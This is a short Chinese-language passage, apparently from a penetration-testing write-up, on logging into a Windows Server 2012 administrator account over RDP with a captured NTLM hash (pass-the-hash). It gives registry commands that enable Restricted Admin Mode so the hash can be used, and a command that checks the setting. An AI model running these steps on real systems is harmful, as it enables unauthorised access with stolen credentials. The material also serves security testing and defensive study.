  1. 利用hash远程登录管理员账号  
因为是win2012无法获取明文密码，直接修改管理员密码稍有些不妥。尝试通过获取管理员NTLM远程登录机器。（并非同一台，这只是提供一个思路）  
![](./img/5558259928524326099.png)

使用hash远程登录RDP，需要开启"Restricted Admin Mode"  
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
/t REG_DWORD /d 00000000 /f //开启Restricted Admin mode  
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr
"DisableRestrictedAdmin" //查看是否已开启0x0则表示开启  
![](./img/8477412657637019108.png)
